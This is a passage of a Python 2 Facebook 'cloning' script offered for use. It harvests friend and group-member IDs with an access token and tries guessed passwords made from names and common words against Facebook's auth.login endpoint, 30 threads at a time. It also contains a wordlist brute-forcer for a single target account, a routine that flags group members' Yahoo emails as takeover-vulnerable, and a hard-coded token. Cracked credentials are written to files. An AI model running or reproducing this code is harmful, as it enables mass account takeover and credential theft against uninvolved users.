															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = l['first_name']+'Sharma'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															e = json.load(data)
															if 'access_token' in e:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in e["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRana-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Mr-Nadeem--•◈•---»" #Dev:M_ASIM
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 
Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()

def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m◇"
	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup not found"
		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
		crack()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+name)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					oks.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m♡"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(oks))
	print"\033[1;96m[+] \033[1;92mFile Asim-Extra\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	crack()
			
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo14
        print '\033[1;93m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
        try:
            email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉rana3426.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;93m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;96m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•."
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
            super()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;91mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD  \033[1;95m👈 With out fb ID free login Paste & Enter👉")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo15
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID indian Old."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_phone()

def pilih_phone():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_phone()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana-Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			phone()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_phone()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Indian Old ID')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'Bahobali'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name']+'Verma'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + 'Kapoor'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'AkhsayKumar'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Katrinakaif'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Sunnyleon'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Katrina123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mMr-Nadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»" #Dev:M_Asim
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 VA.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....Rana-Nadeem....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                WhatsApp Group
              \033[1;94m https://chat.whatsapp.com/GWTPaJVAy1gDHIDgHEw0Ht"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	crack()
          
def mail():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo16
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Pakistan Old."
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_mail()

def pilih_mail():
	peak = raw_input("\n\033[1;95mEnter Number>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_mail()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mRana Nadeem\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			mail()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_mail()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m          Start Cloning Pakistan Old ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:M_Asim
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'Rana'+b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'Malik'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + 'Shah'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'Khan'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Rajpoot'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'Mughal'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name']+'Jutt'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m \x1b[1;92m▣\x1b[1;97m ' + user + ' \x1b[1;92m▣\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m \x1b[1;91m▣\x1b[1;97m ' + user + ' \x1b[1;91m▣\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
